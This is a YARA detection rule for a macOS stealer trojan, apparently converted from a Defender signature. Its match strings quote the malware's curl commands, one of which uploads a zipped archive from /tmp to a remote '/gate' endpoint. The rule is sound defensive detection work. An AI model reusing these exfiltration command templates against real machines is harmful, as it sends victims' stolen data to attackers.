rule Trojan_MacOS_Stealer_AMTB_2147962154_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:MacOS/Stealer!AMTB"
        threat_id = "2147962154"
        type = "Trojan"
        platform = "MacOS: "
        family = "Stealer"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACHOHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "curl -k -s -H \"api-key: %s\" https://%s/dynamic" ascii //weight: 2
        $x_2_2 = "curl -k -X POST -H \"api-key: %s\" -H \"cl: 0\" --max-time 300 -F \"file=@/tmp/osalogging.zip\" -F \"buildtxd=%s\" https://%s/gate" ascii //weight: 2
        $x_2_3 = "5190ef1733183a0dc63fb623357f56d6" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

